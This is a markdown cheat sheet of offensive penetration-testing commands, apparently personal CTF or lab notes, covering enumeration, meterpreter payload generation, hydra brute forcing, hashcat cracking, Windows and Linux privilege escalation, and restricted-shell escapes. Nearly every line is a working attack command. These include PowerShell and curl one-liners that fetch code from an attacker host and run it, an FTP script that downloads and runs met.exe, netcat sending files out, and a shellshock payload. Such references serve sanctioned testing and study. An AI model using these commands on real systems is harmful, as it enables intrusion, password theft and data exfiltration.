## Enum
* `nmap -Pn -n -p- -sT --min-rate 5000 {ip}` _Quick nmap all ports_
* `nmap -Pn -n -p- -sV -A {ip}` _Slow nmap all info_
* `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{site} -r -t {n} -o gobuster.txt ` _Gobuster scan for folders with n threads_
* `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{site} -r -t {n} -x php,asp,aspx,html -o gobuster_aspx.txt` _Gobuster scan for pages with n threads_
* `wfuzz -hw {hide rows with this number of words} --hh {hide rows with this number of chars} -hc {hide rows with this response code} -w {wordlist} {URL}/FUZZ` _Use wfuzz to enumerate pages when gobuster won't work_
* _To clone git repos from challenge machines the url from the git config file must be added to the local host file_
* _https://www.wappalyzer.com/download wappalyzer to identify technologies used on websites_
* _https://retirejs.github.io/retire.js/ find old javascript libraries with known vulns on a a page_
* `impacket/examples/lookupsid.py {user}:{password}@{ip}` _use any valid creds to enumerate other usernames on a windows box_
* `smbmap -u {user} -p '{pass}' -H {ip}` _use valid creds to enumerate shares on a windows box_

## Exploit
* `python -m SimpleHTTPServer 80` _Start python 2 web server on kali on port 80 in current dir_
* `python3 -m http.server 80` _Start a python 3 http server on port 80 in current directory_
* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe >m.exe` _Make a standard meterpreter exe_
* `tcpdump -i {tun0} icmp` _Listen for ping requests.  Useful when testing RCE_

## Password Attacks
* `hydra -l {username} -P {password file} {base url or ip} -s{port} http-post-form "/index.php:user=^USER^&password=^PASS^:{failed string}"`  _Brute force http post login with hydra_
* (figure out hash types)[https://hashcat.net/wiki/doku.php?id=example_hashes] _page with example hashes and their hashcat type/code_
* `hashcat -m {hashtype} hashes.txt ~/Documents/git/SecLists/Passwords/*.txt --force`  _try cracking all hashes in hashes.txt against all seclist password text files, using no gpu_

## Priv Esc Windows
* `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
* `systeminfo >systeminfo.txt` _Export sysinfo from windows
* `python windows-exploit-suggester.py --database 2018-09-06-mssb.xls --systeminfo sysinfo.txt` _Use exported sysinfo file to check for possible exploits using this tool https://github.com/GDSSecurity/Windows-Exploit-Suggester.git_
* `python windows-exploit-suggester.py --update` _Get new database file for exploit suggester_
* `cmd.exe /c @echo open x.x.x.x 21>c:\users\victim\desktop\ftp.txt&@echo USER anonymous>>c:\users\victim\desktop\ftp.txt&@echo anonymous>> c:\users\victim\desktop\ftp.txt&@echo binary>>c:\users\victim\desktop\ftp.txt&@echo get met.exe>>c:\users\victim\desktop\ftp.txt&@echo quit>>c:\users\victim\desktop\ftp.txt&@ftp -v -n -s:c:\users\victim\desktop\ftp.txt&@start met.exe` _Create a scirpt to download a file via ftp, then run the script, then run the downloaded file_
* [Next Gen Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
* [Windows enumeration script](https://github.com/411Hall/JAWS)
* `IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1)` _Download and exec a powershell script in memory_

## Priv Esc Linux
* `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
* `curl {kali_ip}:{port}/linuxprivchecker.py | python` _Run linux priv checker without dropping it on disk_
* `/sbin/getcap -r / 2>/dev/null` _Search filesytem for files with special capabilities.  Similar to suid_
* `find / -type f -name "*" -newermt 2018-09-07 ! -newermt 2018-09-08 2>/dev/null` _Find all files modified on a particular day.  Maybe same day as user flag. example show sep 7 2018_
* `ssh -L {localport}:localhost:{remoteport} {user}@{remoteip}` _Forward a port through ssh_
* `nc -w 3 {attacker ip} {port} < {filename}` _Send file with netcat_
* `nc -l -p {listen port} > {filename}` _Receive file with netcat_
* `sudo -l` _Show commands that can be run as sudo_
* `python -c 'import pty;pty.spawn("/bin/bash")'` _Get a better shell in netcat_
* `CTRZ + z -- stty raw -echo  -- fg` _Make netcat python shell interactive.  You won't see fg when it's typed.  Just hit enter._
* `wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl` _Download exploit suggester_
* `wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh` _Download linux enumeration script_
* `wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64` _Download 64 bit version of pspy for monitoring processes that might run as root_

## Pric Esc Generic
* `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_

## Break out of limited shell 
**(Credit Gos Here https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)**
* `env` _Check environmential variables_
* `echo $PATH` _Check path for executables_
* `echo $SHELL` _What shell is in use_
* `/bin/sh` _Just run new shell_
* `export PATH=/bin:/usr/bin:$PATH` _Just add folders to PATH_
* `export SHELL=/bin/sh` _Just change shell_
* `cp /bin/sh /some/dir/from/PATH; sh` _Copy sh to a runable folder and launch it_
* `ftp, gdb, more, less, man, vi, vim, scp, awk, find` _Can all launch shells_
* `ssh restricted@x.x.x.x -t "/bin/sh"` _Execute /bin/sh before remote shell is loaded_
* `ssh restricted@x.x.x.x -t "bash --noprofile"` _Start remote shell without loading rc profile_
* `ssh restricted@x.x.x.x -t "() { :; }; /bin/bash"` _Try shell shock_
* `python -c 'import os; os.system("/bin/bash")'` _Launch shell with python_
* `perl -e 'exec "/bin/sh";'` _Launch shell with perl_
